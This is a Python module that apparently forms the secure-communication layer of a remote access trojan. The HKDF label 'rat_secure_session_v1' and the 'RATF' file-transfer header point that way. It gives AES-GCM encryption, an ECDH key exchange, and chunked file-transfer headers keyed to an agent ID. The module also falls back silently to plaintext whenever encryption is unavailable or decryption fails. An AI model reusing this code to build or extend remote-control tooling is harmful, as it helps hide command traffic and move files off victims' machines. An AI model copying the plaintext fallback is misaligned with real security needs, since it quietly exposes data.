import base64
import hashlib
import secrets
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import struct


try:
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives import serialization, hashes
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.backends import default_backend
    HAS_CRYPTOGRAPHY = True
except ImportError:
    HAS_CRYPTOGRAPHY = False
    print("WARNING: 'cryptography' not installed. Install with: pip install cryptography")

class AESCryptoGCM:

    
    def __init__(self, key: bytes):
        self.key = key
    
    def encrypt(self, data: str) -> str:
        iv = secrets.token_bytes(12)
        cipher = AES.new(self.key, AES.MODE_GCM, nonce=iv)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode('utf-8'))
        combined = iv + tag + ciphertext
        return base64.b64encode(combined).decode('utf-8')
    
    def decrypt(self, encrypted_data: str) -> str:
        raw = base64.b64decode(encrypted_data)
        iv = raw[:12]
        tag = raw[12:28]
        ciphertext = raw[28:]
        cipher = AES.new(self.key, AES.MODE_GCM, nonce=iv)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext.decode('utf-8')
    
    def encrypt_bytes(self, data: bytes) -> bytes:
        iv = secrets.token_bytes(12)
        cipher = AES.new(self.key, AES.MODE_GCM, nonce=iv)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return iv + tag + ciphertext
    
    def decrypt_bytes(self, data: bytes) -> bytes:
        iv = data[:12]
        tag = data[12:28]
        ciphertext = data[28:]
        cipher = AES.new(self.key, AES.MODE_GCM, nonce=iv)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext

class SecureSession:

    
    def __init__(self):
        self.session_key = None
        self.cipher = None
        self.private_key = None
        self.public_key = None
        self.peer_public_key = None
        
        if HAS_CRYPTOGRAPHY:
            self._init_crypto()
    
    def _init_crypto(self):
        self.private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
        self.public_key = self.private_key.public_key()
    
    def get_public_key_b64(self) -> str:
        if not HAS_CRYPTOGRAPHY or not self.public_key:
            return ""
        pem = self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return base64.b64encode(pem).decode('utf-8')
    
    def set_peer_public_key(self, peer_key_b64: str) -> bool:
        if not HAS_CRYPTOGRAPHY:
            return False
        try:
            peer_pem = base64.b64decode(peer_key_b64)
            peer_public = serialization.load_pem_public_key(peer_pem, backend=default_backend())
            self.peer_public_key = peer_public
            
            shared_secret = self.private_key.exchange(ec.ECDH(), peer_public)
            hkdf = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=None,
                info=b'rat_secure_session_v1',
                backend=default_backend()
            )
            self.session_key = hkdf.derive(shared_secret)
            self.cipher = AESCryptoGCM(self.session_key)
            return True
        except Exception as e:
            print(f"ECDH error: {e}")
            return False
    
    def encrypt(self, plaintext: str) -> str:
        if not self.cipher:
            return plaintext
        return self.cipher.encrypt(plaintext)
    
    def decrypt(self, ciphertext: str) -> str:
        if not self.cipher:
            return ciphertext
        try:
            return self.cipher.decrypt(ciphertext)
        except:
            return ciphertext
    
    def encrypt_bytes(self, data: bytes) -> bytes:
        if not self.cipher:
            return data
        return self.cipher.encrypt_bytes(data)
    
    def decrypt_bytes(self, data: bytes) -> bytes:
        if not self.cipher:
            return data
        try:
            return self.cipher.decrypt_bytes(data)
        except:
            return data

BINARY_MAGIC = b'RATF'
BINARY_VERSION = 1

def pack_binary_header(msg_type, agent_id, filename, chunk_index, total_chunks, file_size, resume_offset=0):
    agent_id_bytes = agent_id.encode('utf-8')[:36]
    filename_bytes = filename.encode('utf-8')[:255]
    header = struct.pack(
        '!4s B 36s 255s Q I I Q',
        BINARY_MAGIC,
        BINARY_VERSION,
        agent_id_bytes.ljust(36, b'\x00'),
        filename_bytes.ljust(255, b'\x00'),
        file_size,
        chunk_index,
        total_chunks,
        resume_offset
    )
    return header

def unpack_binary_header(data):
    if len(data) < 4 + 1 + 36 + 255 + 8 + 4 + 4 + 8:
        return None
    magic, version, agent_id_bytes, filename_bytes, file_size, chunk_index, total_chunks, resume_offset = struct.unpack(
        '!4s B 36s 255s Q I I Q',
        data[:4+1+36+255+8+4+4+8]
    )
    if magic != BINARY_MAGIC:
        return None
    agent_id = agent_id_bytes.split(b'\x00', 1)[0].decode('utf-8')
    filename = filename_bytes.split(b'\x00', 1)[0].decode('utf-8')
    return {
        'version': version,
        'agent_id': agent_id,
        'filename': filename,
        'file_size': file_size,
        'chunk_index': chunk_index,
        'total_chunks': total_chunks,
        'resume_offset': resume_offset
    }